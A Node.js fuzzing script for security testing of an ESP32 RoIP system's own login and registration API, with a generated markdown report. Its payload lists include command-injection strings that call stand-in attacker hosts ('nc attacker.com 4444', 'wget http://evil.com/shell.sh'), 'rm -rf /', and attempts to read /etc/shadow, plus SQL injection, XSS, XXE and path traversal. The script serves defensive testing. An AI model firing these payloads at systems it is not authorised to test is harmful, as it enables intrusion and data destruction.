#!/usr/bin/env node
/**
 * Input Validation Fuzzer
 * Comprehensive fuzzing for ESP32 RoIP system
 */

const fs = require('fs');

const BASE_URL = process.env.BASE_URL || 'http://localhost:8080';
const API_URL = `${BASE_URL}/api/v1`;
const REPORT_FILE = '/home/user/MMDVM/security/reports/pentest-input.md';

let testsRun = 0;
let vulnerabilitiesFound = 0;
let crashesDetected = 0;

// Initialize report
let report = `# Input Validation Fuzzing Report
**ESP32 RoIP System**
**Date:** ${new Date().toISOString().split('T')[0]}

## Executive Summary
This report documents comprehensive input fuzzing to identify parsing vulnerabilities,
buffer overflows, format string bugs, and other input validation issues.

## Fuzzing Payloads

`;

const colors = {
    reset: '\x1b[0m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    red: '\x1b[31m'
};

function log(msg) {
    console.log(`${colors.blue}[INFO]${colors.reset} ${msg}`);
    report += `- ${msg}\n`;
}

function vuln(msg) {
    console.log(`${colors.yellow}[VULN]${colors.reset} ${msg}`);
    report += `  - ⚠ VULNERABILITY: ${msg}\n`;
    vulnerabilitiesFound++;
}

function crash(msg) {
    console.log(`${colors.red}[CRASH]${colors.reset} ${msg}`);
    report += `  - 🔥 CRASH: ${msg}\n`;
    crashesDetected++;
}

function testHeader(title) {
    console.log(`\n${colors.blue}================================${colors.reset}`);
    console.log(`${colors.blue}${title}${colors.reset}`);
    console.log(`${colors.blue}================================${colors.reset}`);
    report += `\n### ${title}\n\n`;
    testsRun++;
}

// Fuzzing payload generators
const fuzzPayloads = {
    // Buffer overflow payloads
    bufferOverflow: [
        'A'.repeat(100),
        'A'.repeat(1000),
        'A'.repeat(10000),
        'A'.repeat(100000),
        '\x00'.repeat(1000),
        '\xff'.repeat(1000)
    ],

    // Format string payloads
    formatString: [
        '%s%s%s%s%s',
        '%x%x%x%x%x',
        '%n%n%n%n%n',
        '%p%p%p%p%p',
        '%s%x%n%p%d',
        '%.1000000s',
        '%999999$s'
    ],

    // Integer overflow/underflow
    integers: [
        '2147483647',  // INT_MAX
        '2147483648',  // INT_MAX + 1
        '-2147483648', // INT_MIN
        '-2147483649', // INT_MIN - 1
        '9999999999999999999',
        '-9999999999999999999',
        '0',
        '-1',
        '0x7fffffff',
        '0xffffffff'
    ],

    // SQL injection
    sqlInjection: [
        "' OR '1'='1",
        "'; DROP TABLE users--",
        "' UNION SELECT NULL--",
        "admin'--",
        "' OR 1=1--",
        "1'; WAITFOR DELAY '00:00:05'--",
        "1' AND SLEEP(5)--",
        "' OR '1'='1' /*",
        "'; EXEC sp_MSForEachTable 'DROP TABLE ?'--"
    ],

    // XSS payloads
    xss: [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        'javascript:alert(1)',
        '<iframe src="javascript:alert(1)">',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '"><script>alert(1)</script>',
        '\'><script>alert(1)</script>'
    ],

    // Command injection
    commandInjection: [
        '; ls -la',
        '| whoami',
        '`id`',
        '$(whoami)',
        '; cat /etc/passwd',
        '| nc attacker.com 4444',
        '; rm -rf /',
        '`cat /etc/shadow`',
        '$(curl http://evil.com)',
        '; wget http://evil.com/shell.sh'
    ],

    // Path traversal
    pathTraversal: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '..;/..;/..;/etc/passwd',
        '/etc/passwd',
        'C:\\windows\\system32\\config\\sam',
        '....\\\\....\\\\....\\\\etc/passwd'
    ],

    // LDAP injection
    ldapInjection: [
        '*',
        '*)(&',
        '*)(uid=*',
        'admin)(&(password=*',
        '*)((|(*',
        '*))(|(password=*'
    ],

    // XML injection
    xmlInjection: [
        '<test>value</test>',
        '<?xml version="1.0"?><test/>',
        '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
        '<![CDATA[<test>]]>',
        '&lt;script&gt;alert(1)&lt;/script&gt;'
    ],

    // NoSQL injection
    nosqlInjection: [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$where": "1==1"}',
        '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
    ],

    // Null bytes
    nullBytes: [
        'test\x00',
        'test\x00.jpg',
        '\x00',
        'test%00',
        'test\0'
    ],

    // Special characters
    specialChars: [
        '!@#$%^&*()',
        '"><script>',
        '\r\n\r\n',
        '\n\n\n',
        '\t\t\t',
        '\\x00\\x01\\x02',
        String.fromCharCode(0, 1, 2, 3, 4, 5)
    ],

    // Unicode/UTF-8
    unicode: [
        '\u0000',
        '\uffff',
        '\ud800',
        '𝕳𝖊𝖑𝖑𝖔',
        '☠️💀👻',
        '​', // Zero-width space
        '\u202e' + 'gnirts', // Right-to-left override
        '﷽' // Arabic ligature
    ],

    // JSON bombs
    jsonBombs: [
        JSON.stringify({ a: 'x'.repeat(1000000) }),
        JSON.stringify(Array(10000).fill('x')),
        '{"a":"' + 'x'.repeat(100000) + '"}'
    ],

    // Empty/whitespace
    emptyValues: [
        '',
        ' ',
        '  ',
        '\t',
        '\n',
        '\r\n',
        null,
        'null',
        'undefined'
    ],

    // Type confusion
    typeConfusion: [
        'true',
        'false',
        '[]',
        '{}',
        '[1,2,3]',
        '{"key":"value"}',
        'NaN',
        'Infinity',
        '-Infinity'
    ]
};

// Fuzz a single endpoint
async function fuzzEndpoint(method, path, field, payload, token = null) {
    const options = {
        method: method,
        headers: {
            'Content-Type': 'application/json'
        }
    };

    if (token) {
        options.headers['Authorization'] = `Bearer ${token}`;
    }

    if (method !== 'GET') {
        const body = {};
        body[field] = payload;
        options.body = JSON.stringify(body);
    }

    try {
        const https = require(BASE_URL.startsWith('https') ? 'https' : 'http');
        const url = new URL(path, BASE_URL);

        return new Promise((resolve) => {
            const req = https.request(url, options, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    resolve({
                        status: res.statusCode,
                        body: data,
                        error: null
                    });
                });
            });

            req.on('error', (err) => {
                resolve({
                    status: 0,
                    body: null,
                    error: err.message
                });
            });

            req.setTimeout(5000, () => {
                req.destroy();
                resolve({
                    status: 0,
                    body: null,
                    error: 'Timeout'
                });
            });

            if (options.body) {
                req.write(options.body);
            }
            req.end();
        });
    } catch (err) {
        return {
            status: 0,
            body: null,
            error: err.message
        };
    }
}

// Analyze response for vulnerabilities
function analyzeResponse(payload, response, context) {
    // Check for crashes
    if (response.error && response.error !== 'Timeout') {
        crash(`Service crashed or connection failed: ${response.error} (Payload: ${payload.substring(0, 50)})`);
        return;
    }

    // Check for timeout (possible DoS)
    if (response.error === 'Timeout') {
        vuln(`Request timeout - possible DoS (Payload: ${payload.substring(0, 50)})`);
        return;
    }

    // Check for error disclosure
    if (response.body) {
        const body = response.body.toLowerCase();

        // Stack traces
        if (body.includes('stack') || body.includes('trace') || body.match(/at .*:\d+:\d+/)) {
            vuln(`Stack trace disclosure (Payload: ${payload.substring(0, 50)})`);
        }

        // Database errors
        if (body.includes('sql') || body.includes('database') || body.includes('syntax error')) {
            vuln(`Database error disclosure (Payload: ${payload.substring(0, 50)})`);
        }

        // Path disclosure
        if (body.match(/\/[a-z]+\/[a-z]+\//i) || body.includes('c:\\')) {
            vuln(`Path disclosure in error message (Payload: ${payload.substring(0, 50)})`);
        }

        // Command output
        if (body.includes('uid=') || body.includes('gid=') || body.includes('root:')) {
            vuln(`CRITICAL: Command injection successful! (Payload: ${payload.substring(0, 50)})`);
        }

        // File contents
        if (body.includes('/bin/bash') || body.includes('administrator')) {
            vuln(`CRITICAL: File disclosure successful! (Payload: ${payload.substring(0, 50)})`);
        }
    }

    // Check for unexpected status codes
    if (response.status >= 500) {
        log(`Server error ${response.status} (Payload: ${payload.substring(0, 50)})`);
    }
}

// Main fuzzing function
async function runFuzzTests() {
    testHeader('Fuzzing Test Suite');

    log('Starting comprehensive input fuzzing...');

    // Test endpoints
    const endpoints = [
        { method: 'POST', path: '/api/v1/auth/login', field: 'username' },
        { method: 'POST', path: '/api/v1/auth/login', field: 'password' },
        { method: 'POST', path: '/api/v1/auth/register', field: 'email' }
    ];

    // Test each payload category
    for (const [category, payloads] of Object.entries(fuzzPayloads)) {
        testHeader(`Fuzzing Category: ${category}`);

        log(`Testing ${payloads.length} payloads in category: ${category}`);

        let tested = 0;
        for (const payload of payloads) {
            for (const endpoint of endpoints) {
                const response = await fuzzEndpoint(
                    endpoint.method,
                    endpoint.path,
                    endpoint.field,
                    payload
                );

                analyzeResponse(payload, response, {
                    category,
                    endpoint: endpoint.path,
                    field: endpoint.field
                });

                tested++;

                if (tested % 10 === 0) {
                    process.stdout.write('.');
                }
            }
        }

        console.log(''); // New line
        log(`Completed ${category} fuzzing (${payloads.length} payloads)`);
    }
}

// Specific vulnerability tests
async function testBufferOverflow() {
    testHeader('Buffer Overflow Testing');

    log('Testing for buffer overflow vulnerabilities');

    const sizes = [100, 1000, 10000, 100000, 1000000];

    for (const size of sizes) {
        const payload = 'A'.repeat(size);

        const response = await fuzzEndpoint(
            'POST',
            '/api/v1/auth/login',
            'username',
            payload
        );

        if (response.error) {
            crash(`Service crashed with ${size}-byte payload`);
        } else {
            log(`Service handled ${size}-byte payload (HTTP ${response.status})`);
        }

        // Small delay to avoid overwhelming the service
        await new Promise(resolve => setTimeout(resolve, 100));
    }
}

async function testFormatString() {
    testHeader('Format String Vulnerability Testing');

    log('Testing for format string vulnerabilities');

    for (const payload of fuzzPayloads.formatString) {
        const response = await fuzzEndpoint(
            'POST',
            '/api/v1/auth/login',
            'username',
            payload
        );

        if (response.body && response.body.match(/0x[0-9a-f]+/i)) {
            vuln(`Possible format string vulnerability (Payload: ${payload})`);
        }

        analyzeResponse(payload, response, { category: 'format-string' });
    }
}

async function testIntegerOverflow() {
    testHeader('Integer Overflow/Underflow Testing');

    log('Testing for integer overflow vulnerabilities');

    for (const payload of fuzzPayloads.integers) {
        const response = await fuzzEndpoint(
            'POST',
            '/api/v1/devices',
            'sip_port',
            parseInt(payload) || payload
        );

        analyzeResponse(payload, response, { category: 'integer' });
    }
}

// Main execution
async function main() {
    console.log(`${colors.green}================================${colors.reset}`);
    console.log(`${colors.green}Input Validation Fuzzer${colors.reset}`);
    console.log(`${colors.green}Target: ${BASE_URL}${colors.reset}`);
    console.log(`${colors.green}================================${colors.reset}`);

    try {
        await runFuzzTests();
        await testBufferOverflow();
        await testFormatString();
        await testIntegerOverflow();
    } catch (err) {
        console.error('Fuzzing error:', err);
    }

    // Write summary
    report += `
## Fuzzing Summary

- **Tests Run:** ${testsRun}
- **Vulnerabilities Found:** ${vulnerabilitiesFound}
- **Crashes Detected:** ${crashesDetected}

## Vulnerability Categories Tested

1. **Buffer Overflows** - Oversized input handling
2. **Format Strings** - Format string vulnerabilities
3. **Integer Overflows** - Integer boundary conditions
4. **SQL Injection** - Database query manipulation
5. **XSS** - Cross-site scripting
6. **Command Injection** - OS command execution
7. **Path Traversal** - File system access
8. **LDAP Injection** - LDAP query manipulation
9. **XML Injection** - XML parsing attacks
10. **NoSQL Injection** - NoSQL query manipulation
11. **Null Byte Injection** - Null terminator attacks
12. **Unicode Attacks** - Unicode/UTF-8 handling
13. **JSON Bombs** - Resource exhaustion via JSON
14. **Type Confusion** - Type validation bypasses

## Recommendations

1. **CRITICAL:** Implement comprehensive input validation on all endpoints
2. Add input length limits (e.g., 1000 chars for text fields)
3. Sanitize all user inputs before processing
4. Use parameterized queries to prevent SQL injection
5. Implement output encoding to prevent XSS
6. Validate data types strictly
7. Add request size limits
8. Implement timeout protection
9. Use secure coding practices
10. Regular security testing with fuzzing tools

## Tools for Further Testing

- **AFL (American Fuzzy Lop)** - Coverage-guided fuzzing
- **Radamsa** - General-purpose fuzzer
- **Boofuzz** - Protocol fuzzing framework
- **Sulley** - Network protocol fuzzer
- **OWASP ZAP** - Web application fuzzer
- **Burp Intruder** - HTTP fuzzing

## Next Steps

1. Review all vulnerability findings
2. Fix critical vulnerabilities immediately
3. Implement input validation framework
4. Add automated fuzzing to CI/CD pipeline
5. Perform regular security testing
6. Monitor for exploitation attempts
`;

    // Write report
    fs.writeFileSync(REPORT_FILE, report);

    console.log(`\n${colors.green}================================${colors.reset}`);
    console.log(`${colors.green}Fuzzing Complete${colors.reset}`);
    console.log(`${colors.green}Tests Run: ${testsRun}${colors.reset}`);
    console.log(`${colors.yellow}Vulnerabilities: ${vulnerabilitiesFound}${colors.reset}`);
    console.log(`${colors.red}Crashes: ${crashesDetected}${colors.reset}`);
    console.log(`${colors.green}Report: ${REPORT_FILE}${colors.reset}`);
    console.log(`${colors.green}================================${colors.reset}`);
}

// Run if executed directly
if (require.main === module) {
    main().catch(console.error);
}

module.exports = { fuzzPayloads, fuzzEndpoint, analyzeResponse };
